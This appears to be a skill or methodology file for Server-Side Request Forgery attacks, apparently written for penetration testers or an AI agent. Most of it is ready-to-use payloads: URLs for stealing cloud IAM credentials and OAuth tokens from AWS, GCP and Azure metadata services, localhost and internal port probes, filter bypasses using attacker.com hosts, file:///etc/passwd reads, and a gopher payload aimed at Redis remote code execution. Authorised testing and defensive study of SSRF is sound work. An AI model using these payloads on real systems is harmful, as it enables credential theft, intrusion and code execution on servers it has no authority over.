---
name: ssrf
description: Server-Side Request Forgery expert methodology covering basic SSRF, blind SSRF, cloud metadata endpoint attacks, DNS rebinding, and protocol smuggling. Includes filter bypass and post-exploitation pivoting.
version: 1.0.0
license: Apache-2.0
---

# Server-Side Request Forgery (SSRF)

## Attack Surface

Any server-side feature that makes outbound requests using user-supplied URLs or hostnames: webhook URLs, document fetchers (PDF generation, URL preview), image loaders, API proxy endpoints, import from URL features, XML parsers with external entity support, PDF converters, health check endpoints.

## Methodology

### Phase 1 — Identify SSRF injection points

```
Test all URL/hostname parameters with: http://169.254.169.254/
Look for: webhook_url=, callback=, url=, endpoint=, host=, server=, destination=
Test HTTP headers: X-Forwarded-Host, Host, Referer
Check XML inputs (potential XXE with SSRF)
```

### Phase 2 — Basic SSRF verification

```
http://burpcollaborator.net        -- OOB verification
http://127.0.0.1:80               -- localhost access
http://127.0.0.1:22               -- SSH port (timing-based detection)
http://127.0.0.1:3306             -- MySQL
http://0.0.0.0                    -- alternative localhost
http://[::1]                      -- IPv6 localhost
http://2130706433                 -- 127.0.0.1 in decimal
```

### Phase 3 — Cloud metadata endpoint attacks

**AWS:**
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/
http://[fd00:ec2::254]/latest/meta-data/    (IPv6)
```

**GCP:**
```
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/ -H "Metadata-Flavor: Google"
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

**Azure:**
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
  Header: Metadata: true
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

### Phase 4 — SSRF bypass techniques

**IP encoding:**
```
127.0.0.1 → 0x7f000001 (hex), 2130706433 (decimal), 017700000001 (octal)
```

**DNS rebinding:**
Use a domain that resolves to a public IP on first lookup, then to 127.0.0.1 on second:
Set short TTL (1s) to win the race between validation and request.

**Redirect chain:**
Host a redirect at an allowed URL: `Location: http://169.254.169.254/latest/meta-data/`
Some SSRF filters check the initial URL but follow redirects to internal hosts.

**URL scheme attacks:**
```
file:///etc/passwd
dict://127.0.0.1:6379/INFO    (Redis)
gopher://127.0.0.1:25/        (SMTP — pre-auth commands)
ftp://127.0.0.1:21/
sftp://attacker.com:11111/    (OOB with credentials)
```

**Filter bypass with URL parsers:**
```
http://attacker.com@127.0.0.1/
http://127.0.0.1#attacker.com
http://127.1
http://127.000.000.001
```

### Phase 5 — Post-exploitation

**Enumerate internal services:**
```
http://10.0.0.1:22       SSH
http://10.0.0.1:3306     MySQL
http://10.0.0.1:5432     PostgreSQL
http://10.0.0.1:6379     Redis (SSRF to RCE via gopher://)
http://10.0.0.1:9200     Elasticsearch
http://10.0.0.1:8500     Consul
```

**Redis RCE via SSRF + Gopher:**
```
gopher://127.0.0.1:6379/_FLUSHALL%0d%0aSET%20shell%20%22%0d%0a%0d%0a%2f%2f...
```

## Tools

- Burp Suite Collaborator — blind SSRF OOB detection
- [SSRFire](https://github.com/micha3lb3n/SSRFire) — automated SSRF scanner
- [Gopherus](https://github.com/tarunkant/Gopherus) — gopher:// payload generator
- [SSRF Sheriff](https://github.com/teknogeek/ssrf-sheriff) — SSRF detection server

## OWASP Top 10 Mapping

- A10:2021 — Server-Side Request Forgery
